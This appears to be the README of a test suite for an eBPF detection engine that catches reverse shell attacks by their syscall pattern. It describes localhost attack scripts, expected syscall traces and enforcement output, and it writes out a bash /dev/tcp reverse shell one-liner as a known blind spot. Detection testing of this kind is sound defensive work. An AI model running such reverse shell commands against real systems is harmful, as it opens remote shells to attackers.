# Grimoire Pattern Detection Test Suite

Test scripts for validating the Sovereign Grimoire behavioral detection engine.

## The Doctrine of Testing

**Purpose:** Verify that Grimoire can detect reverse shell attack patterns using syscall-level behavioral analysis.

**Philosophy:** "A weapon untested is a weapon unproven. The Crucible reveals truth."

## ⚠️ CRITICAL: Verify BPF Attachment First

**Before running any tests**, verify that Grimoire BPF program actually attaches:

```bash
sudo ./tests/grimoire/verify-attachment.sh
```

**Expected:**
```
✅ GLORIOUS VICTORY!
   - Grimoire BPF program is LOADED
   - Grimoire is ATTACHED to tracepoint
   - Tracepoint is ENABLED
   - Saw 1,234,567 syscalls (realistic count)
```

**If it fails:** See `ATTACHMENT_FIX.md` for details about the silent attachment failure bug.

**Why this matters:** Previous versions had a silent attachment failure where `bpf_program__attach()` returned success but didn't actually attach. This was fixed by using explicit `bpf_program__attach_tracepoint()`. Without proper attachment, Guardian is completely blind to syscalls.

---

## Test Scripts

### 1. Syscall Verification (strace)

Verify that attack tools make the expected syscalls:

```bash
# Test Python reverse shell syscalls
./tests/grimoire/strace-python-reverse-shell.sh [IP] [PORT]

# Test netcat reverse shell syscalls
./tests/grimoire/strace-netcat-reverse-shell.sh [IP] [PORT]
```

**Expected output:**
```
socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("127.0.0.1")}, 16) = 0
dup2(3, 0) = 0
dup2(3, 1) = 1
dup2(3, 2) = 2
execve("/bin/sh", ["/bin/sh", "-i"], ...) = 0
```

### 2. Live Attack Scripts

Execute reverse shell attacks for Guardian detection:

```bash
# Python reverse shell (recommended - always uses real syscalls)
./tests/grimoire/attack-python-reverse-shell.sh [IP] [PORT]

# Netcat reverse shell (if supported)
./tests/grimoire/attack-netcat-reverse-shell.sh [IP] [PORT]
```

### 3. Listener Helper

```bash
# Start listener in separate terminal
./tests/grimoire/start-listener.sh [PORT]
```

## Full Test Procedure

### Terminal 1: Start Guardian with Debug Logging
```bash
sudo ./zig-out/bin/zig-sentinel \
  --enable-grimoire \
  --grimoire-enforce \
  --grimoire-debug \
  --duration=300
```

Wait for: `✅ Grimoire ring buffer consumer ready`

### Terminal 2: Start Listener
```bash
./tests/grimoire/start-listener.sh 4444
```

Wait for: `Ncat: Listening on 0.0.0.0:4444`

### Terminal 3: Execute Attack
```bash
# First verify syscalls with strace
./tests/grimoire/strace-python-reverse-shell.sh 127.0.0.1 4444

# Then execute live attack
./tests/grimoire/attack-python-reverse-shell.sh 127.0.0.1 4444
```

## Expected Results

### Glorious Victory (Guardian Detects)

**Terminal 1 (Guardian):**
```
[GRIMOIRE-DEBUG] PID=12345 syscall=41 count=1 | class=NETWORK
[GRIMOIRE-DEBUG] PID=12345 Pattern=reverse_shell_classic Step=1/4 SYSCALL_MATCH
[GRIMOIRE-DEBUG] PID=12345 Pattern=reverse_shell_classic Step=2/4 SYSCALL_MATCH
[GRIMOIRE-DEBUG] PID=12345 Pattern=reverse_shell_classic Step=3/4 SYSCALL_MATCH
[GRIMOIRE-DEBUG] PID=12345 syscall=59 count=5 | class=PROCESS_CREATE
[GRIMOIRE-DEBUG] PID=12345 Pattern=reverse_shell_classic Step=4/4 SYSCALL_MATCH
[GRIMOIRE-DEBUG] PID=12345 Pattern=reverse_shell_classic COMPLETE_MATCH! All 4 steps matched
🔥 GRIMOIRE PATTERN MATCH: reverse_shell_classic (CRITICAL)
   PID: 12345
⚔️  Terminated process 12345 for violating Grimoire doctrine
```

**Terminal 2 (Listener):** Silent (no connection - process terminated)

**Terminal 3 (Attack):** Hangs or exits with error (process killed)

### Instructive Failure (Guardian Blind)

**Terminal 1 (Guardian):** No debug output for attack PID, no pattern match

**Terminal 2 (Listener):** `Ncat: Connection from 127.0.0.1` + shell prompt

**Terminal 3 (Attack):** Exits cleanly

## Known Issues

### Bash /dev/tcp/ Does NOT Use Real Syscalls

❌ **DO NOT TEST WITH:**
```bash
bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"
```

**Reason:** Bash's `/dev/tcp/` is a shell builtin that doesn't make `socket()`, `connect()`, or `dup2()` syscalls visible to eBPF. Guardian cannot intercept these.

✅ **USE INSTEAD:** Python or netcat with `-e` flag (real syscalls)

## Files

- `verify-attachment.sh` - **[NEW]** Verify BPF program actually attaches (run this first!)
- `ATTACHMENT_FIX.md` - **[NEW]** Documentation of the silent attachment bug and fix
- `strace-python-reverse-shell.sh` - Trace Python syscalls
- `strace-netcat-reverse-shell.sh` - Trace netcat syscalls
- `attack-python-reverse-shell.sh` - Execute Python reverse shell
- `attack-netcat-reverse-shell.sh` - Execute netcat reverse shell
- `start-listener.sh` - Start netcat listener
- `show-monitored-syscalls.sh` - Display which syscalls are in BPF pre-filter map
- `show-bpf-stats.sh` - Read BPF statistics from grimoire_stats map
- `README.md` - This file

## Troubleshooting

**No debug output for attack PID:**
- Check Guardian started with `--grimoire-debug`
- Verify attack tool makes real syscalls (use strace scripts)
- Check Guardian still running when attack executes

**Pattern matches but not terminated:**
- Verify `--grimoire-enforce` flag is set
- Check Guardian has permission to kill processes (needs root)

**Connection succeeds but no detection:**
- Return to the Forge - the blade needs tempering
- Check pattern definitions in `grimoire.zig`
- Verify syscall numbers match architecture (x86_64)
